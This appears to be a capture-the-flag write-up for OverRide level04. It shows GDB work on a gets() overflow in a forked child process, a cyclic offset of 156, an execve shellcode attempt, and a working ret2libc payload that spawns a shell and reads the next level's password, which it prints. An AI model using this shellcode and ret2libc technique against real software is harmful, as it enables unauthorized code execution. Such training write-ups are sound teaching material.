

```
level04@OverRide:~$ ./level04
Give me some shellcode, k
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
child is exiting...
```
i noticed gets() which is vulnurable to beffetOverflow
```
run

=> 0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    %eax,0xac(%esp)
   
(gdb) ni
0x080486db in main ()
(gdb) Give me some shellcode, k   
   
```
as u see the main parent process jumps directly to the prompt

In GDB, ptrace is used to monitor and control the execution of the program being debugged. 
GDB uses ptrace to set breakpoints, read and write memory, and control the execution of the program.

When ptrace() is called, it allows the parent process to observe and control the execution of the child process.

In the case of gdb, it calls fork() to create a child process, and then calls ptrace() on the child to observe and control its execution.
This allows gdb to pause the execution of the child process, inspect its memory and registers, set breakpoints, and other debugging operations.

One alternative to inferior command in GDB to trace the execution of forked child process is to use the set follow-fork-mode command.

`By default, GDB stops the parent process when it encounters a fork call, and allows you to continue debugging the child process.` 

The set follow-fork-mode command allows you to specify how GDB should handle the creation of a child process. You can set it to one of the following modes:

parent: GDB will remain attached to the parent process after a fork, and will not automatically follow the child process.
child: GDB will detach from the parent process and attach to the child process after a fork.
ask: GDB will prompt you for which process to follow after a fork.


(gdb) set follow-fork-mode child
```
=> 0x80486d6 <main+14>:	call   0x8048550 <fork@plt>
   0x80486db <main+19>:	mov    %eax,0xac(%esp)
   
   
(gdb) i r
eax            0x0	0

so now we re dealing with a child process
```



=> 0x804875e <main+150>:	call   0x80484b0 <gets@plt>

```
(gdb) run <<< "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1709]
=> 0x6261616f

(gdb) i r $eip
eip            0x6261616f

➜  Desktop cyclic -l 0x6261616f
156

(gdb) run <<<$(python -c 'print "A" * 156 + "BBBB"')
Cannot access memory at address 0x42424242
```

```
(gdb)
=> 0x804875e <main+150>:	call   0x80484b0 <gets@plt>

(gdb) x/60wx $esp
0xffffd650:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd660:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd670:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd680:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x42424242

(gdb) p/d 0xffffd6ec - 0xffffd650
$2 = 156

```
this syntax with shellcode isn't working for me
`(python -c 'print "A" * 135 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xff\xff\xd6\x50"[::-1]' ; cat) | ./level04`

ill try ret2libc
```
p system
$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) info proc mappings
   0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
   
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec   
```
```
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "AAAA" + "\xf7\xf8\x97\xec"[::-1]' ; cat) | ./level04
Give me some shellcode, k
pwd
/home/users/level04
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```


























